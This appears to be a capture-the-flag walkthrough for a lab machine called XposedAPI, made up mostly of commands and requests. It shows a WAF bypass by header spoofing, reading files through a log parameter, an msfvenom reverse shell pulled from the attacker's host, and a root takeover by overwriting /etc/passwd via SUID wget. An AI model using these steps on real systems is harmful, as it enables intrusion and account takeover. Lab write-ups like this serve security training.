# XposedAPI

### Enumeration

```
...
13337/tcp open  http    Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
...
```

> /logs
>
> Methods: GET
>
> /update
>
> Methods: POST
>
> Updates the app using a linux executable. Content-Type: application/json {"user":"", "url":""}
>
> /restart
>
> Methods: GET

```
POST /update HTTP/1.1
...
Content-Type: application/json
Content-Length: 48

{"user":"test", "url":"http://192.168.49.60/"}

Response:
Invalid username.
```

We need a valid username.

```
GET /logs HTTP/1.1

Response:
WAF: Access Denied for this Host.
```

**Added to request header ->** `X-Forwarded-For: 127.0.0.1`

```
GET /logs HTTP/1.1
...
X-Forwarded-For: 127.0.0.1

Response:
Error! No file specified. Use file=/path/to/log/file to access log files.
```

```
GET /logs?file=/etc/passwd HTTP/1.1
...
X-Forwarded-For: 127.0.0.1

Response:
root:x:0:0:root:/root:/bin/bash
...
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

### Initial Access

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.60 LPORT=80 -f elf -o reverse.elf
```

```
POST /update HTTP/1.1
...
Content-Type: application/json

{"user":"clumsyadmin", "url":"http://192.168.49.60/shell.sh"}

Response:
Update requested by clumsyadmin. Restart the software for changes to take effect.
```

```
GET /restart HTTP/1.1
POST /restart HTTP/1.1
...
{"confirm":"true"}
```

### PrivEsc

```
clumsyadmin@xposedapi:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/wget
```

Copy contents of /etc/passwd to your host as passwd.

Add this user with this command:

```
echo "ch:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> passwd
```

**ch:pass123**

```
clumsyadmin@xposedapi:/$ wget http://192.168.49.60/passwd -O /etc/passwd

clumsyadmin@xposedapi:/$ su ch
password:pass123
```
